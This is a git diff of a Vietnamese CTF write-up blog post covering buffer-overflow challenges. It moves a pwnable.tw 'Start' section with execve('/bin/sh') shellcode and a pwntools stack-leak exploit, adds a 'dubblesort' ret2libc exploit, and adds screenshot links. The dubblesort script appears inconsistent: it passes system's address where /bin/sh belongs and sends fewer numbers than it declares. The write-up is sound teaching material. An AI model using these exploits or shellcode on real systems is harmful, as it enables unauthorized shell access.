@@ -1,3 +1,4 @@
+
 ---
 title: "Phaphajian"
 date: 2021-11-07T22:54:13+07:00
@@ -313,98 +314,6 @@ exploit()
 ```
 ![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_flag.png?raw=true)
 
-
-# PWNABLE.TW
-## Start
-
-Đề bài cung cấp cho chúng ta 1 file chương trình trên Linux, vì vậy để biết thì chúng ta phải xem thử xem nó làm cái gì nào!
-.....
-Sau khi chạy thì thấy rằng chương trình in ra dòng *Let's start the CTF:* sau đó get chuỗi chúng ta nhập vào bằng cách nào đó, để biết được cấu trúc chương trình thì chúng ta dùng gdb để disassemble chương trình ra và được hàm _start: 
-```
-   0x08048060 <+0>:	push   esp
-   0x08048061 <+1>:	push   0x804809d
-   0x08048066 <+6>:	xor    eax,eax
-   0x08048068 <+8>:	xor    ebx,ebx
-   0x0804806a <+10>:	xor    ecx,ecx
-   0x0804806c <+12>:	xor    edx,edx
-   0x0804806e <+14>:	push   0x3a465443
-   0x08048073 <+19>:	push   0x20656874
-   0x08048078 <+24>:	push   0x20747261
-   0x0804807d <+29>:	push   0x74732073
-   0x08048082 <+34>:	push   0x2774654c
-   0x08048087 <+39>:	mov    ecx,esp
-   0x08048089 <+41>:	mov    dl,0x14
-   0x0804808b <+43>:	mov    bl,0x1
-   0x0804808d <+45>:	mov    al,0x4
-   0x0804808f <+47>:	int    0x80
-   0x08048091 <+49>:	xor    ebx,ebx
-   0x08048093 <+51>:	mov    dl,0x3c
-   0x08048095 <+53>:	mov    al,0x3
-   0x08048097 <+55>:	int    0x80
-   0x08048099 <+57>:	add    esp,0x14
-   0x0804809c <+60>:	ret    
-
-```
-Như chúng ta thấy thì code asm này khá thô, code dùng những phương thức đơn giản nhất đó chính là sys_call, ví dụ khi eax = 1 thì gọi sys_exit, sys_read = 3, sys_write = 4 ,...
-Về việc in ra dòng *Let's start the CTF:* thì chương trình chỉ push chuỗi dưới dạng hex vào stack sau đó gọi sys_write để in ra mà thôi! 
-
-Sau đó gọi sys_read để đọc input vào và tăng esp lên 0x14 để ret. Điều đó làm mình có thể suy đoán là stack này sẽ có độ dài là 0x14. 
-
-Vậy thì không có lỗ hổng thông thường nào như gets(), ... được xuất hiện ở đây, điều đó có nghĩa là chúng ta chỉ việc đưa shellcode vào stack và thực hiện shell thôi!
-Để thực hiện được việc gọi shellcode quyền năng là "/bin/sh" thì chúng ta search gg có shellcode sau : 
-```
-   0:   31 c9                   xor    ecx, ecx
-   2:   f7 e1                   mul    ecx
-   4:   51                      push   ecx
-   5:   68 2f 2f 73 68          push   0x68732f2f
-   a:   68 2f 62 69 6e          push   0x6e69622f
-   f:   89 e3                   mov    ebx, esp
-  11:   b0 0b                   mov    al, 0xb
-  13:   cd 80                   int    0x80
-
-shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
-```
-Sau đó yêu cầu tiếp theo là chúng ta phải tìm được esp_addr thì mới có thể add shellcode vào và thực thi được, để tìm được thì chúng ta chú ý câu lệnh *" 0x08048087 <+39>:	mov    ecx,esp"* câu lệnh này có nghĩa là esp sẽ được đưa vào ecx nên từ đấy chúng ta có thể leak được esp sau đó tính toán stack trả về và đưa shellcode vào : 
-
-```
-from pwn import *
-
-BIN = "./start"
-DEBUG = 1
-
-shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
-addr = 0x08048087 
-
-io = process(BIN)
-context.log_level = 'debug'
-# io = remote("chall.pwnable.tw", 10000)
-
-
-#_breakpoint = """
-#		0x08048099
-#	"""
-#gdb.attach(io,_breakpoint)
-io.recvuntil("CTF:")
-payload = b'A' * 0x14 + p32(addr)
-io.send(payload)
-esp_addr = u32(io.recv(4))
- 
-print("[+]Esp address = ", hex(esp_addr))
- 
-payload = b'A' * 0x14 + p32(esp_addr + 0x14) + shellcode
-io.sendline(payload)
-io.interactive()
-```
-
-
-
-
-
-
-
-
-
-
 ### Return2LibC_Once
 ##### Return2LibC_Once - x86 - ret2libc: nc 45.122.249.68 10011
 File [BIN](), [LIBC]()
@@ -413,9 +322,14 @@ Qua tới bài này rồi thì ta sẽ không ôn lại những kỹ thuật cũ
 
 Làm thủ tục thì chúng ta thấy rằng, chỉ có NX là được bật và đây là 1 file 32 bit
 
-
+![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ret2libc_checksec.png??raw=true)
 
 Dùng IDA bắt lại và phân tích flow 
+
+
+![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ret2libc_IDA2.png??raw=true)
+
+![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ret2libc_IDA.png??raw=true)
 
 
 Ta rút ra được như sau : 
@@ -503,6 +417,9 @@ context.log_level="debug"
 exploit()
 ```
 
+![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ret2libc_shell.png??raw=true)
+
+
 ### Buf1
 ###### 
 
@@ -511,19 +428,31 @@ Bắt đầu run thử ./buf1 xem sao:
  
 Khi nhập 1 string dài thì:
 
- 
+ ![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/Buf1.png??raw=true)
+
+ ![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/Buf2.png??raw=true)
+
 Ồ đã có lỗi. Bây giờ mình xem code assembly nó xem sao nào
  
 Có hàm gets, đây là hàm đọc input, và chắc chắn nó gây ra lỗi. Tiếp tục bật IDA xem thử:
 
- 
+ ![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/Buf3.png??raw=true)
+
 Trong đây có 1 hàm Puts_flag:
 
+ ![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/Buf4.png??raw=true)
+
+ ![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/Buf5.png??raw=true)
  
 Khi check1 == 1, check2 ==2, check3 == 3 thì mình mới có flag! Vậy các biến check này đâu ra, tiếp tục xem trong IDA, ta thấy được 3 hàm như sau:
 
+ ![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/buf6.png??raw=true)
  
- 
+ ![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/buf7.png??raw=true)
+
+ ![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/buf8.png??raw=true)
+
+
  
 Từ đây mình có ý tưởng như sau: bây giờ chỉ cần set biến v0 = 1337, sau đó cho nó đi qua từng hàm một ở trên để các biến check được gán, sau đó Puts_flag là xong. Tiếp tục quay lại pwn_gdb để tìm cách thực thi nào~
 
@@ -531,12 +460,20 @@ Từ đây mình có ý tưởng như sau: bây giờ chỉ cần set biến v0 
 Mình đặt break point ở main+92 là ngay chỗ gets, để xem mình nhập input vào nó sẽ nằm đâu trong stack, từ đó để mình chèn payload vào!
 Mình nhập đoạn “aaaabbbbccccddddeeefff” để tiện kiểm tra xem. Show stack sau khi nhập:
 
- 
+ ![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/buf9.png??raw=true)
+
+
 Tiếp tục dùng lệnh “ni” đến ret, ta thấy tham số truyền vào là 0x7ffff7e12e00 là ở vị trí df3c và df38:
 
+
+![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/buf10.png??raw=true)
  
 Đây là nơi mình truyền các địa chỉ hàm vào return address.
 Bây giờ bỏ qua bước gán các biến check, mình thử xem nó truyền vào được hàm không đã:
+
+
+![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/buf11.png??raw=true)
+
 
 Dùng lệnh “info functions”, mình có được tất cả địa chỉ của các hàm như sau:
 
@@ -762,21 +699,196 @@ exploit()
 
 
 
+# PWNABLE.TW
+## Start
+
+Đề bài cung cấp cho chúng ta 1 file chương trình trên Linux, vì vậy để biết thì chúng ta phải xem thử xem nó làm cái gì nào!
+.....
+Sau khi chạy thì thấy rằng chương trình in ra dòng *Let's start the CTF:* sau đó get chuỗi chúng ta nhập vào bằng cách nào đó, để biết được cấu trúc chương trình thì chúng ta dùng gdb để disassemble chương trình ra và được hàm _start: 
+```
+   0x08048060 <+0>:	push   esp
+   0x08048061 <+1>:	push   0x804809d
+   0x08048066 <+6>:	xor    eax,eax
+   0x08048068 <+8>:	xor    ebx,ebx
+   0x0804806a <+10>:	xor    ecx,ecx
+   0x0804806c <+12>:	xor    edx,edx
+   0x0804806e <+14>:	push   0x3a465443
+   0x08048073 <+19>:	push   0x20656874
+   0x08048078 <+24>:	push   0x20747261
+   0x0804807d <+29>:	push   0x74732073
+   0x08048082 <+34>:	push   0x2774654c
+   0x08048087 <+39>:	mov    ecx,esp
+   0x08048089 <+41>:	mov    dl,0x14
+   0x0804808b <+43>:	mov    bl,0x1
+   0x0804808d <+45>:	mov    al,0x4
+   0x0804808f <+47>:	int    0x80
+   0x08048091 <+49>:	xor    ebx,ebx
+   0x08048093 <+51>:	mov    dl,0x3c
+   0x08048095 <+53>:	mov    al,0x3
+   0x08048097 <+55>:	int    0x80
+   0x08048099 <+57>:	add    esp,0x14
+   0x0804809c <+60>:	ret    
+
+```
+Như chúng ta thấy thì code asm này khá thô, code dùng những phương thức đơn giản nhất đó chính là sys_call, ví dụ khi eax = 1 thì gọi sys_exit, sys_read = 3, sys_write = 4 ,...
+Về việc in ra dòng *Let's start the CTF:* thì chương trình chỉ push chuỗi dưới dạng hex vào stack sau đó gọi sys_write để in ra mà thôi! 
+
+Sau đó gọi sys_read để đọc input vào và tăng esp lên 0x14 để ret. Điều đó làm mình có thể suy đoán là stack này sẽ có độ dài là 0x14. 
+
+Vậy thì không có lỗ hổng thông thường nào như gets(), ... được xuất hiện ở đây, điều đó có nghĩa là chúng ta chỉ việc đưa shellcode vào stack và thực hiện shell thôi!
+Để thực hiện được việc gọi shellcode quyền năng là "/bin/sh" thì chúng ta search gg có shellcode sau : 
+```
+   0:   31 c9                   xor    ecx, ecx
+   2:   f7 e1                   mul    ecx
+   4:   51                      push   ecx
+   5:   68 2f 2f 73 68          push   0x68732f2f
+   a:   68 2f 62 69 6e          push   0x6e69622f
+   f:   89 e3                   mov    ebx, esp
+  11:   b0 0b                   mov    al, 0xb
+  13:   cd 80                   int    0x80
+
+shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+```
+Sau đó yêu cầu tiếp theo là chúng ta phải tìm được esp_addr thì mới có thể add shellcode vào và thực thi được, để tìm được thì chúng ta chú ý câu lệnh *" 0x08048087 <+39>:	mov    ecx,esp"* câu lệnh này có nghĩa là esp sẽ được đưa vào ecx nên từ đấy chúng ta có thể leak được esp sau đó tính toán stack trả về và đưa shellcode vào : 
+
+```
+from pwn import *
+
+BIN = "./start"
+DEBUG = 1
+
+shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+addr = 0x08048087 
+
+io = process(BIN)
+context.log_level = 'debug'
+# io = remote("chall.pwnable.tw", 10000)
+
+
+#_breakpoint = """
+#		0x08048099
+#	"""
+#gdb.attach(io,_breakpoint)
+io.recvuntil("CTF:")
+payload = b'A' * 0x14 + p32(addr)
+io.send(payload)
+esp_addr = u32(io.recv(4))
+ 
+print("[+]Esp address = ", hex(esp_addr))
+ 
+payload = b'A' * 0x14 + p32(esp_addr + 0x14) + shellcode
+io.sendline(payload)
+io.interactive()
+```
+
+
+
+### dubblesort 
+
+Chúng ta có một file 32 bit với canary và pie . Do đó, chúng ta có thể triển khai các hướng sau :
+
+Chúng ta phải tìm cách đọc bộ nhớ để có được các libc base của libc hoặc dubblesort => ret2libc
+
+
+
+![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/db_checksec.png??raw=true)
+
+
+
+![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/db_checksec_IDA.png??raw=true)
+```
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  _BYTE *v4; // edi
+  unsigned int i; // esi
+  unsigned int j; // esi
+  int result; // eax
+  unsigned int v8; // [esp+18h] [ebp-74h] BYREF
+  _BYTE v9[32]; // [esp+1Ch] [ebp-70h] BYREF
+  char buf[64]; // [esp+3Ch] [ebp-50h] BYREF
+  unsigned int v11; // [esp+7Ch] [ebp-10h]
+
+  v11 = __readgsdword(0x14u);
+  sub_8B5();
+  __printf_chk(1, "What your name :");
+  read(0, buf, 0x40u);
+  __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
+  __isoc99_scanf("%u", &v8);
+  v3 = v8;
+  if ( v8 )
+  {
+    v4 = v9;
+    for ( i = 0; i < v8; ++i )
+    {
+      __printf_chk(1, "Enter the %d number : ");
+      fflush(stdout);
+      __isoc99_scanf("%u", v4);
+      v3 = v8;
+      v4 += 4;
+    }
+  }
+  sub_931(v9, v3);
+  puts("Result :");
+  if ( v8 )
+  {
+    for ( j = 0; j < v8; ++j )
+      __printf_chk(1, "%u ");
+  }
+  result = 0;
+  if ( __readgsdword(0x14u) != v11 )
+    sub_BA0();
+  return result;
+}
+```
 
 
 
 
+```
+from pwn import *
+
+BIN = "./dubblesort"
+elf = ELF(BIN)
+libc = ELF("./libc_32.so.6")
+system = libc.symbols['system']
+print(system)
+binsh = next(libc.search(b'/bin/sh\x00'))
+print(binsh)
 
 
+def exploit():
+	payload = b"a"*24
+	io.recvuntil("What your name :")
+	io.sendline(payload)
+	leak = u32(io.recv(4))
+	libc_base = leak - 0x0a - 0x1b0000
+	print("Libc base : ",hex(libc_base))
 
 
+	syscall = libc_base + system
+	bincall = libc_base + binsh
+
+	print("System: ", hex(syscall))
+	print("/Bin/sh: ", hex(binsh))
+
+	io.recvuntil("How many numbers do you what to sort :")
+	io.sendline(b"35")
+
+	for i in range(24):
+		io.recvuntil("number :")
+		io.sendline(b"1")
+	for i in range(8):
+		io.recvuntil("number :")
+		io.sendline(p32(syscall))
+	for i in range(2):
+		io.recvuntil("number :")
+		io.sendline(p32(syscall))
+	io.interactive()
+
+io = process(BIN)
+exploit()
 
 
-
-
-
-
-
-
-
+```
 
